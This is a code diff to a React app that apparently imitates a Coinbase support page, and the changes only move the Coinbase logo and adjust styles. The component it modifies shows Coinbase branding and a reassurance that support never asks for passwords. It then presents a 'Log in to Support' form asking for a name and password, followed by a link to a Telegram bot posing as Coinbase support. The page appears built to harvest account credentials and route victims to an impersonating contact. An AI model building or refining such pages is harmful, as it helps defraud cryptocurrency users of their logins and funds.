@@ -40,49 +40,53 @@ function App() {
   };
 
   return (
-    <div>
-      <div style={header}>
-        <a href="/" style={{ display: "flex", alignItems: "center" }}>
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Coinbase_Logo.svg/512px-Coinbase_Logo.svg.png" alt="Coinbase" style={logoStyle} />
-        </a>
-      </div>
+    <div style={wrapper}>
+      {!showLogin ? (
+        <>
+          <h1 style={{ fontSize: 28, marginBottom: 10 }}>Find answers to your questions</h1>
+          <p style={{ color: "#cbd5e1", marginBottom: 30 }}>Search help topics or browse categories below.</p>
 
-      <div style={wrapper}>
-        {!showLogin ? (
-          <>
-            <h1 style={{ fontSize: 28, marginBottom: 10 }}>Find answers to your questions</h1>
-            <p style={{ color: "#cbd5e1", marginBottom: 30 }}>Search help topics or browse categories below.</p>
-
-            <div style={catRow}>
-              {categories.map((cat, i) => (
-                <div key={i} style={catCard} onClick={() => toggleCategory(i)}>
-                  <div style={{ fontSize: 24 }}>{cat.icon}</div>
-                  <div style={{ fontSize: 14, fontWeight: 600 }}>{cat.title}</div>
-                  {openCategory === i && (
-                    <div style={{ marginTop: 8, color: "#cbd5e1", fontSize: 12 }}>{cat.answer}</div>
-                  )}
-                </div>
-              ))}
-            </div>
-
-            <div style={policyBox}>
-              <h3>Our support team will never ask for your password or 2-step verification codes.</h3>
-              <p>We’re here to help you stay safe and secure while using Coinbase.</p>
-            </div>
-
-            <button style={buttonStyle} onClick={() => setShowLogin(true)}>Sign in to speak with us</button>
-          </>
-        ) : !loggedIn ? (
-          <div style={fullHeightCenter}>
-            <div style={box}>
-              <h2 style={{ marginBottom: 20 }}>Log in to Support</h2>
-              <input style={inputStyle} placeholder="Your name" value={name} onChange={(e) => setName(e.target.value)} />
-              <input type="password" style={inputStyle} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
-              <button style={buttonStyle} onClick={handleLogin}>Log in</button>
-            </div>
+          <div style={catRow}>
+            {categories.map((cat, i) => (
+              <div key={i} style={catCard} onClick={() => toggleCategory(i)}>
+                <div style={{ fontSize: 24 }}>{cat.icon}</div>
+                <div style={{ fontSize: 14, fontWeight: 600 }}>{cat.title}</div>
+                {openCategory === i && (
+                  <div style={{ marginTop: 8, color: "#cbd5e1", fontSize: 12 }}>{cat.answer}</div>
+                )}
+              </div>
+            ))}
           </div>
-        ) : (
+
+          <div style={policyBox}>
+            <h3>Our support team will never ask for your password or 2-step verification codes.</h3>
+            <p>We’re here to help you stay safe and secure while using Coinbase.</p>
+          </div>
+
+          <button style={buttonStyle} onClick={() => setShowLogin(true)}>Sign in to speak with us</button>
+        </>
+      ) : !loggedIn ? (
+        <div style={centerScreen}>
           <div style={box}>
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Coinbase_Logo.svg/256px-Coinbase_Logo.svg.png"
+              alt="Coinbase"
+              style={logoStyle}
+            />
+            <h2 style={{ marginBottom: 20 }}>Log in to Support</h2>
+            <input style={inputStyle} placeholder="Your name" value={name} onChange={(e) => setName(e.target.value)} />
+            <input type="password" style={inputStyle} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
+            <button style={buttonStyle} onClick={handleLogin}>Log in</button>
+          </div>
+        </div>
+      ) : (
+        <div style={centerScreen}>
+          <div style={box}>
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Coinbase_Logo.svg/256px-Coinbase_Logo.svg.png"
+              alt="Coinbase"
+              style={logoStyle}
+            />
             <h2 style={{ marginBottom: 20 }}>Welcome, {name}</h2>
             <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
               💬 Contact us via Telegram
@@ -94,22 +98,11 @@ function App() {
             <button style={buttonStyle} onClick={sendEmail}>📨 Send Message</button>
             {sent && <p style={{ color: "lightgreen" }}>✅ Message sent!</p>}
           </div>
-        )}
-      </div>
+        </div>
+      )}
     </div>
   );
 }
-
-const header = {
-  background: "#0a0f1c",
-  padding: "12px 30px",
-  display: "flex",
-  alignItems: "center"
-};
-
-const logoStyle = {
-  height: "28px"
-};
 
 const wrapper = {
   maxWidth: 1000,
@@ -118,11 +111,17 @@ const wrapper = {
   textAlign: "center"
 };
 
-const fullHeightCenter = {
+const centerScreen = {
   minHeight: "90vh",
   display: "flex",
   justifyContent: "center",
-  alignItems: "center"
+  alignItems: "center",
+  flexDirection: "column"
+};
+
+const logoStyle = {
+  height: "28px",
+  marginBottom: "16px"
 };
 
 const catRow = {
@@ -162,7 +161,6 @@ const policyBox = {
 
 const inputStyle = {
   width: "100%",
-  maxWidth: "100%",
   padding: "12px",
   borderRadius: "8px",
   backgroundColor: "#0f172a",
